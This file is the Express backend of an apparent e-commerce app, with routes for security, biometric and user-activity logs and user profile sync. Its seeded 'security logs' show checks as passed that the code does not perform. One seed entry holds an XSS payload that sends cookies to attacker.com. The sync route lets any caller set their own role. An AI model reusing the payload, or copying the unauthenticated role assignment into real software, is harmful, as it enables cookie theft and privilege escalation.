import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import { createServer as createViteServer } from "vite";
import * as dotenv from "dotenv";
import { db } from "./src/db/index.ts";
import { users, securityLogs, biometricAttemptLogs, userMovements } from "./src/db/schema.ts";
import { eq, desc } from "drizzle-orm";

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Routes
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok", database: "connected", instance: "Cloud SQL" });
  });

  // Get Security Logs
  app.get("/api/security-logs", async (req, res) => {
    try {
      const logs = await db.select().from(securityLogs).orderBy(desc(securityLogs.id));
      if (logs.length === 0) {
        // Seed initial data if database is empty
        const initialLogs = [
          {
            type: 'TCP_ATTESTATION',
            status: 'PASSED',
            detail: 'TPM 2.0 Platform Configuration Register (PCR[0..7]) cryptographic digest verified. Secure boot verified.',
            payloadSnippet: 'SHA256: 8f434346648f6b96df89dda901c5176b10a6d83961dd3c1ac88b59b2dc327aa4'
          },
          {
            type: 'SQLI_CHECK',
            status: 'PASSED',
            detail: 'Parameterized query wrapper sanitized search string input. Zero injection vectors found.',
            payloadSnippet: "SELECT * FROM products WHERE category = $1 AND status = 'ACTIVE'"
          },
          {
            type: 'XSS_FILTER',
            status: 'BLOCKED',
            detail: 'Detected and neutralized inline script tag attempt in product search query parameter.',
            payloadSnippet: '<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>'
          },
          {
            type: 'CSRF_VALIDATION',
            status: 'PASSED',
            detail: 'Valid SameSite=Strict HTTP-Only anti-forgery token matched session cryptographic nonce.',
            payloadSnippet: 'X-CSRF-Token: 94a08da1fecbb6e8b46990538c7b50b2'
          },
          {
            type: 'BIOMETRIC_AUTH',
            status: 'PASSED',
            detail: 'WebAuthn FIDO2 public key assertion verified via hardware biometric authenticator (TouchID / Android Fingerprint).',
            payloadSnippet: 'authenticatorData: flags(ED+AT), signCount=14, credId=0x88f21a...'
          }
        ];
        
        const seeded = await db.insert(securityLogs).values(initialLogs).returning();
        return res.json(seeded);
      }
      res.json(logs);
    } catch (error: any) {
      console.error("Failed to query security logs:", error);
      res.status(500).json({ error: "Failed to query security logs from Cloud SQL", details: error.message });
    }
  });

  // Post Security Log
  app.post("/api/security-logs", async (req, res) => {
    try {
      const { type, status, detail, payloadSnippet } = req.body;
      const [newLog] = await db.insert(securityLogs).values({
        type: type || 'TCP_ATTESTATION',
        status: status || 'PASSED',
        detail: detail || 'Telemetry active',
        payloadSnippet: payloadSnippet || ''
      }).returning();
      res.json(newLog);
    } catch (error: any) {
      console.error("Failed to create security log:", error);
      res.status(500).json({ error: "Failed to create security log in Cloud SQL", details: error.message });
    }
  });

  // Get Biometric Attempt Logs
  app.get("/api/biometric-logs", async (req, res) => {
    try {
      const logs = await db.select().from(biometricAttemptLogs).orderBy(desc(biometricAttemptLogs.id));
      if (logs.length === 0) {
        // Seed initial biometric logs
        const initialBioLogs = [
          {
            userEmailOrId: 'amani.shirima@smarttrade.tz',
            deviceInfo: 'Android Biometric Sensor (Samsung S24 / Chrome 126)',
            actionType: 'ENROLLMENT',
            result: 'SUCCESS',
            detail: 'Hardware FIDO2 WebAuthn credential successfully enrolled inside secure enclave.',
            attestationType: 'packed'
          },
          {
            userEmailOrId: 'grace.mtei@smarttrade.tz',
            deviceInfo: 'Apple Touch ID / Face ID (iPhone 15 Pro / Safari 17.5)',
            actionType: 'LOGIN_VERIFICATION',
            result: 'SUCCESS',
            detail: 'ECDSA P-256 cryptographic challenge assertion verified.',
            attestationType: 'apple-anonymous'
          },
          {
            userEmailOrId: 'kelvin.john@smarttrade.tz',
            deviceInfo: 'Windows Hello TPM Biometric (Dell XPS / Edge 125)',
            actionType: 'CHECKOUT_AUTHORIZATION',
            result: 'FAILED',
            detail: 'Sensor timeout: User did not place fingerprint within 60s challenge window.',
            attestationType: 'none'
          }
        ];
        const seeded = await db.insert(biometricAttemptLogs).values(initialBioLogs).returning();
        return res.json(seeded);
      }
      res.json(logs);
    } catch (error: any) {
      console.error("Failed to query biometric logs:", error);
      res.status(500).json({ error: "Failed to query biometric logs from Cloud SQL", details: error.message });
    }
  });

  // Post Biometric Attempt Log
  app.post("/api/biometric-logs", async (req, res) => {
    try {
      const { userEmailOrId, deviceInfo, actionType, result, detail, attestationType } = req.body;
      const [newLog] = await db.insert(biometricAttemptLogs).values({
        userEmailOrId: userEmailOrId || 'guest',
        deviceInfo: deviceInfo || 'Unknown Device',
        actionType: actionType || 'LOGIN_VERIFICATION',
        result: result || 'SUCCESS',
        detail: detail || 'Authenticated via TouchID',
        attestationType: attestationType || 'none'
      }).returning();
      res.json(newLog);
    } catch (error: any) {
      console.error("Failed to create biometric log:", error);
      res.status(500).json({ error: "Failed to create biometric log in Cloud SQL", details: error.message });
    }
  });

  // Get User Movements
  app.get("/api/user-movements", async (req, res) => {
    try {
      const movements = await db.select().from(userMovements).orderBy(desc(userMovements.id));
      if (movements.length === 0) {
        // Seed initial movements
        const initialMovements = [
          {
            userEmail: 'baraka.mwakio@tzmail.com',
            userName: 'Baraka Mwakio',
            actionType: 'LOGIN',
            description: 'Authenticated via PBKDF2 Salted SHA-256 Hash challenge.',
            ipOrDevice: '197.250.18.42 (Vodacom 4G / Android 14)'
          },
          {
            userEmail: 'baraka.mwakio@tzmail.com',
            userName: 'Baraka Mwakio',
            actionType: 'PAGE_VIEW',
            description: 'Browsed catalog category: Electronics and Gadgets.',
            ipOrDevice: '197.250.18.42 (Vodacom 4G)'
          },
          {
            userEmail: 'baraka.mwakio@tzmail.com',
            userName: 'Baraka Mwakio',
            actionType: 'ADD_TO_CART',
            description: 'Added product to cart: Samsung Galaxy S24 Ultra 5G (Qty: 1)',
            ipOrDevice: '197.250.18.42'
          }
        ];
        const seeded = await db.insert(userMovements).values(initialMovements).returning();
        return res.json(seeded);
      }
      res.json(movements);
    } catch (error: any) {
      console.error("Failed to query user movements:", error);
      res.status(500).json({ error: "Failed to query user movements from Cloud SQL", details: error.message });
    }
  });

  // Post User Movement
  app.post("/api/user-movements", async (req, res) => {
    try {
      const { userEmail, userName, actionType, description, ipOrDevice } = req.body;
      const [newMovement] = await db.insert(userMovements).values({
        userEmail: userEmail || 'anonymous.guest@tznet.co.tz',
        userName: userName || 'Guest Visitor',
        actionType: actionType || 'PAGE_VIEW',
        description: description || 'Browsed store main page.',
        ipOrDevice: ipOrDevice || 'Web Client'
      }).returning();
      res.json(newMovement);
    } catch (error: any) {
      console.error("Failed to create user movement:", error);
      res.status(500).json({ error: "Failed to create user movement in Cloud SQL", details: error.message });
    }
  });

  // Sync / Upsert User profile
  app.post("/api/users/sync", async (req, res) => {
    try {
      const { uid, email, name, phone, location, role } = req.body;
      if (!uid || !email) {
        return res.status(400).json({ error: "uid and email are required to sync user profile" });
      }

      const existing = await db.select().from(users).where(eq(users.uid, uid)).limit(1);

      if (existing.length > 0) {
        const updated = await db.update(users)
          .set({ email, name, phone, location, role: role || 'user' })
          .where(eq(users.uid, uid))
          .returning();
        return res.json(updated[0]);
      } else {
        const [inserted] = await db.insert(users).values({
          uid,
          email,
          name: name || '',
          phone: phone || '',
          location: location || '',
          role: role || 'user'
        }).returning();
        return res.json(inserted);
      }
    } catch (error: any) {
      console.error("Failed to sync user profile:", error);
      res.status(500).json({ error: "Failed to sync user profile in Cloud SQL", details: error.message });
    }
  });

  // Vite Integration & Assets
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
